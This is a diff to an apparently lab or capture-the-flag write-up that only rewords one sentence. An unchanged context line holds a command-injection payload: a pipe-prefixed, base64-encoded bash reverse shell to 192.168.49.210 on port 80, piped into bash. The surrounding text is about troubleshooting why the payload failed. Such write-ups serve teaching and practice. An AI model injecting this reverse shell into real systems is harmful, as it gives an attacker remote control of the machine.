@@ -93,7 +93,7 @@ For some reason the following `base64` encoded reverse shell payload still did n
 |echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjIxMC84MCAwPiYx'|base64 -d|bash
 ``` 
 
-Which is really weird not sure why. So to troubleshoot I tried removing the last `|bash` part in my payload so it will print the `base64` decoded payload instead of executing it with bash, and I got the following response
+Which is really weird, So to troubleshoot I tried removing the last `|bash` part in my payload so it will print the `base64` decoded payload instead of executing it with bash, and I got the following response
            
 ![](\assets\images\noname-pg\2022-07-27-16-48-44.png)
 
